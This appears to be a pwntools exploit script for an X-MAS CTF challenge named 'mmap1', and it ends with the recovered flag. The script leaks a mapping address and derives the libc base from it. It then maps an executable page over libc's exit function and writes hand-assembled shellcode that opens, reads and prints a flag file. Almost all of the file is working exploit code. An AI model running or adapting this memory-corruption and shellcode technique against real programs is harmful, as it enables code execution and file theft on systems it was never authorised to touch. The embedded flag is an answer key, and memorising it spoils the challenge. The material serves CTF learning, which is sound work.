from pwn import *
elf = ELF('./mmap1_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

#p = remote('172.17.0.2', 2003)
p = elf.process()
def mmap(addr, sz, prot, flags, fd, offset):
    p.sendlineafter(b'=', b'1')
    p.sendlineafter(b'=', b'%s' % hex(addr).encode())
    p.sendlineafter(b'=', b'%s' % hex(sz).encode())
    p.sendlineafter(b'=', b'%d' % prot)
    p.sendlineafter(b'=', b'%d' % flags)
    p.sendlineafter(b'=', b'%d' % fd)
    p.sendlineafter(b'=', b'%d' % offset)

def read_mmap(sz):
    p.sendlineafter(b'=', b'2')
    p.sendlineafter(b'=', b'%d' % sz)
    return p.recvn(sz)

def write_mmap(sz, data):
    p.sendlineafter(b'=', b'3')
    p.sendlineafter(b'=', b'%d' % sz)
    p.sendlineafter(b'=', b'%s' % data)

mmap(
    0,          # dynamic
    0x100000,   # allocate large size map so it will be mapped before libc region
    3,          # PROT_READ|PROT_WRITE
    1,          # MAP_SHARED
    3,          # logger file fd
    0
)
leak_mmap = eval(read_mmap(100).decode().split('\n')[1][8:])
log.info(f'mmap pointer @ 0x{leak_mmap:x}')
write_mmap(32, b'/home/ctf/flag.txt'.ljust(32, b'\x00'))
# ubuntu 20.04 offset
# this base on our mmap size + .tls size
# [our mmap]
# [.tls]
# [libc]
libc.address = leak_mmap + (0x100000 + 0x3000) 
log.info(f'libc base @ 0x{libc.address:x}')
overwrite_offset = libc.sym['exit'] & 0xfffffffffffff000
log.info(f'overwrite region @ 0x{overwrite_offset:x}')

mmap(
    overwrite_offset,
    1,  # if size < 4096, it will be map with size 4096
    7,  # PROT_READ|PROT_WRITE|PROT_EXEC
    49, # MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS
        # MAP_SHARED    = share mappings
        # MAP_FIXED     = fixed address
        # MAP_ANONYMOUS = can do mmap without specify fd
    0,
    0
)

# stage 1, open the file and get the fd number
# stage 2, read the file data from fd number byte-by-byte until nullbyte then insert into writeable address
# stage 3, write (get output) the file data from the writeable address
shellcode = asm(f'''
mov rdi, 0x{leak_mmap:x}
xor rsi, rsi
mov rdx, rsi
mov rax, 0x2
syscall

mov rbx, 0
mov rdi, rax

mov rsi, 0x{leak_mmap+0x100:x}
add rsi, rbx
inc rbx
mov rdx, 0x1
xor rax, rax
syscall

cmp byte ptr [%rsi], 0x00
''', arch='amd64')

# loop until null byte 
shellcode += b'\x75' + p8(0xff-37+5) # jne rip-5 => mov rsi, leak_mmap

# dec from rbx (need a fix size), then output the content 
# of the file on the writeable address
shellcode += asm(f'''
dec rbx

mov rdi, 1
mov rsi, 0x{leak_mmap+0x100:x}
mov rdx, rbx
mov rax, 0x1
syscall

xor rdi, rdi
mov rax, 0x3c
syscall
''', arch='amd64')

# because mmap use MAP_FIXED flags and use the libc region as address, then the libc region is overwritten with 0
# we need padding until offset of func@exit, basically we redirect execution with exit
write_mmap(libc.sym['exit'] - overwrite_offset + len(shellcode), b'\x00'*(libc.sym['exit'] - overwrite_offset) + shellcode)

# do exit, redirect to shellcode and get the flag
p.sendlineafter(b'=', b'4')
log.success(f'flag: {p.recvline().strip().decode()}')
# X-MAS{70_m4p_0r_70_unm4p_7h15_15_7h3_qu35710n}